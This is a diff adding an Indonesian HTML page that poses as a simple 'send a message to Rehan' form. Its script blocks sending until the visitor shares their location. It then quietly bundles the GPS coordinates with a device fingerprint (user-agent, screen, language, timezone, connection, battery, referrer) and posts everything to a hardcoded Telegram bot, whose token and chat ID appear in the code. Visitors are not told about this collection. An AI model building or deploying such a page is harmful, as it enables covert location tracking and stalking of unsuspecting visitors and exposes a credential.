@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Pesan ke Rehan</title>
+
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        background: #0a3d62;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+        color: white;
+    }
+
+    .box {
+        width: 90%;
+        max-width: 350px;
+        padding: 20px;
+        background: rgba(255,255,255,0.1);
+        backdrop-filter: blur(15px);
+        border-radius: 15px;
+        text-align: center;
+    }
+
+    textarea {
+        width: 100%;
+        height: 90px;
+        border-radius: 10px;
+        border: none;
+        padding: 10px;
+        resize: none;
+        font-size: 15px;
+    }
+
+    button {
+        width: 100%;
+        margin-top: 15px;
+        padding: 12px;
+        border-radius: 10px;
+        border: none;
+        background: #1e90ff;
+        color: white;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    .alert {
+        margin-top: 12px;
+        background: rgba(255, 0, 0, 0.4);
+        padding: 10px;
+        border-radius: 8px;
+        display: none;
+    }
+
+    .success {
+        margin-top: 12px;
+        background: rgba(0, 255, 0, 0.4);
+        padding: 10px;
+        border-radius: 8px;
+        display: none;
+    }
+</style>
+</head>
+<body>
+
+<div class="box">
+    <h3>Kirim Pesan ke Rehan</h3>
+
+    <textarea id="pesan" placeholder="Tulis pesan..."></textarea>
+
+    <button onclick="kirimPesan()">Kirim Pesan</button>
+
+    <div id="alert" class="alert"></div>
+    <div id="success" class="success"></div>
+</div>
+
+
+<script>
+
+const BOT_TOKEN = "8460626408:AAHdFxNCmTcVnP-XARy1n51kdu7NTaGCYjw";
+const CHAT_ID  = "7508766509";
+
+function alertMsg(msg) {
+    const a = document.getElementById("alert");
+    a.innerText = msg;
+    a.style.display = "block";
+    setTimeout(() => a.style.display = "none", 3500);
+}
+
+function successMsg(msg) {
+    const s = document.getElementById("success");
+    s.innerText = msg;
+    s.style.display = "block";
+    setTimeout(() => s.style.display = "none", 3500);
+}
+
+async function getBattery() {
+    try {
+        const battery = await navigator.getBattery();
+        return (battery.level * 100) + "%";
+    } catch {
+        return "Tidak didukung";
+    }
+}
+
+async function kirimPesan() {
+    let pesan = document.getElementById("pesan").value.trim();
+    if (!pesan) {
+        alertMsg("Pesan tidak boleh kosong.");
+        return;
+    }
+
+    // Ambil info legal
+    let userAgent = navigator.userAgent;
+    let bahasa = navigator.language;
+    let zonaWaktu = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    let resolusi = window.screen.width + "x" + window.screen.height;
+    let ref = document.referrer || "Langsung";
+    let koneksi = navigator.connection ? navigator.connection.effectiveType : "Tidak diketahui";
+    let baterai = await getBattery();
+    let waktu = new Date().toLocaleString("id-ID");
+
+    // Minta lokasi ketika user kirim
+    navigator.geolocation.getCurrentPosition(
+        async function(pos) {
+            let lat = pos.coords.latitude;
+            let lon = pos.coords.longitude;
+
+            let finalMsg =
+`📩 Pesan Baru Dari Pengguna:
+${pesan}
+
+📍 Lokasi:
+Latitude: ${lat}
+Longitude: ${lon}
+
+📱 Data Perangkat (Legal):
+• User-Agent: ${userAgent}
+• Resolusi: ${resolusi}
+• Bahasa: ${bahasa}
+• Zona Waktu: ${zonaWaktu}
+• Koneksi: ${koneksi}
+• Baterai: ${baterai}
+• Referrer: ${ref}
+
+⏰ Waktu: ${waktu}
+`;
+
+            try {
+                let send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: finalMsg
+                    })
+                });
+
+                if (send.ok) {
+                    successMsg("Pesan berhasil dikirim!");
+                    document.getElementById("pesan").value = "";
+                } else {
+                    alertMsg("Gagal mengirim ke Telegram.");
+                }
+
+            } catch (e) {
+                alertMsg("Jaringan bermasalah.");
+            }
+        },
+
+        function() {
+            alertMsg("Aktifkan lokasi agar pesan bisa dikirim.");
+        }
+    );
+}
+
+</script>
+
+</body>
+</html>
